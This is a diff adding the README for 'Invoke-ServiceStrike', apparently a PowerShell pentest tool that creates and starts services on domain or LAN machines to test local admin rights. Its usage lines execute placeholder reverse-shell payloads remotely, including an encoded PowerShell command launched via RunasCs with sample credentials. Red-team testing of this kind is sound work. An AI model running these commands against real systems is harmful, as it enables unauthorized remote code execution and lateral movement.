@@ -1,2 +1,23 @@
 # Invoke-ServiceStrike
-        Attempts to create and start a service by bypassing the OpenService call, in order to verify whether the current user has local admin privileges on domain or LAN machines, assuming only SC_MANAGER_ALL_ACCESS right is available on the SCManager.
+Attempts to create and start a service by bypassing the OpenService call, in order to verify whether the current user has local admin privileges on domain or LAN machines, assuming that only the SC_MANAGER_ALL_ACCESS right is available on the SCManager.
+
+## Usage
+<img src="https://github.com/pol4ir/Invoke-ServiceStrike/blob/main/test.gif">
+
+```
+Invoke-ServiceStrike -Command <cmd>
+```
+```
+Invoke-ServiceStrike -Command <revShell> [-timeout 45000 -threads 5 -ComputerName '192.168.1.103']
+```
+
+### RunAs
+The script runs under the current user session. If you're in an interactive shell and need to execute it under a different security context, you can use Runas.
+```
+runas /user:contoso.local\user1 /netonly powershell
+```
+If you're working in a non-interactive shell, you can use <a href="https://github.com/antonioCoco/RunasCs">Invoke-RunasCs</a>
+
+```
+Invoke-RunasCs -Domain contoso.local -Username user1 -Password dfgV?DS7-8 -Command "powershell . C:\Invoke-ServiceStrike.ps1;Invoke-ServiceStrike -Command 'cmd /c powershell -e <revb64>' -ServiceName TEST" -logontype 9
+```
